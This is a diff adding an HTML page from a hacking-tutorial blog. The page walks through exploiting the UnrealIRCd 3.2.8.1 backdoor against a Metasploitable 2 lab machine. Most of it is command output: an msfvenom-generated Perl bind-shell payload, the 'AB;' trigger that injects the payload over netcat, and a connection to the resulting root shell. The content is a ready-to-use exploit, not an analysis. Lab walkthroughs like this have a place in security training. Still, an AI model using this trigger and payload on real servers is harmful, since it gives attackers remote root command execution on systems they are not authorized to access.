@@ -1,0 +1,85 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="stylesheet" href="main.css" type="text/css" />
+<link rel="stylesheet" href="blog.css" type="text/css" />
+<link rel="alternate" type="application/rss+xml" title="Subscribe to this page..." href="feed.rss" />
+<title>UnrealIRCD 3.2.8.1 Backdoor Command Execution</title>
+</head><body>
+<div id="divbodyholder">
+<div class="headerholder"><div class="header">
+<div id="title">
+<h1 class="nomargin"><a class="ablack" href="https://metalkey.net/index.html">m3t4lk3y</a></h1>
+<div id="description">Hacking tutorials + info</div>
+</div></div></div>
+<div id="divbody"><div class="content">
+<!-- entry begin -->
+<h3><a class="ablack" href="unrealircd-3281-backdoor-command-execution.html">
+UnrealIRCD 3.2.8.1 Backdoor Command Execution
+</a></h3>
+<!-- bashblog_timestamp: #201607021911.59# -->
+<div class="subtitle">July 02, 2016 &mdash; 
+metalkey
+</div>
+<!-- text begin -->
+<strong>Attacker:</strong> Kali Linux<br>
+<strong>Victim:</strong> Metasploitable 2<br>
+<br>
+Unreal IRCD 3.2.8.1 contains a backdoor that is triggered by entering <strong>AB;</strong> upon connecting. The backdoor was present in the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.<br>
+<br>
+The following example demonstrates it’s use on Metasploitable 2 (192.168.1.142).<br></p>
+
+<h2>Generating the Payload</h2>
+
+<p>We’re going to generate a unix bind shell with msfvenom (port 4444) and connect to this with Netcat.
+<code></p>
+
+<div class="code">
+root@kali:~$ <com>msfvenom -p cmd/unix/bind_perl --payload-options</com><br>
+root@kali:~$ <com>msfvenom -p cmd/unix/bind_perl LHOST=192.168.1.142</com><br>
+No platform was selected, choosing Msf::Module::Platform::Unix from the payload<br>
+No Arch selected, selecting Arch: cmd from the payload<br>
+No encoder or badchars specified, outputting raw payload<br>
+Payload size: 240 bytes<br>
+<b>perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(){if($_=~ /(.*)/){system $1;}};'</b><br>
+</div>
+
+<p></code></p>
+
+<h2>Triggering the Exploit</h2>
+
+<p><code></p>
+
+<div class="code">
+root@kali:~$ <com>nc -vn 192.168.1.142 6667</com><br>
+(UNKNOWN) [192.168.1.142] 6667 (ircd) open<br>
+:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...<br>
+:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead<br>
+<com>AB;perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(){if($_=~ /(.*)/){system $1;}};'</com><br>
+:irc.Metasploitable.LAN 451 AB;perl :You have not registered
+</div>
+
+<p></code></p>
+
+<h2>Connecting to the Netcat Bind Shell</h2>
+
+<p><code></p>
+
+<div class="code">
+root@kali:~$ <com>nc -vn 192.168.1.142 4444</com><br>
+(UNKNOWN) [192.168.1.142] 4444 (?) open<br>
+<com>python -c "import pty;pty.spawn('/bin/bash')"</com><br>
+root@metasploitable:/etc/unreal#
+</div>
+
+<p></code></p>
+
+<p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>
+<!-- text end -->
+<!-- entry end -->
+</div>
+<div id="footer">CC by-nc-nd <a href="https://twitter.com/m3t4lk3y">metalkey</a> &mdash; <a href="mailto:"></a><br/>
+Generated with <a href="https://github.com/cfenollosa/bashblog">bashblog</a>, a single bash script to easily create blogs like this one</div>
+</div></div>
+</body></html>
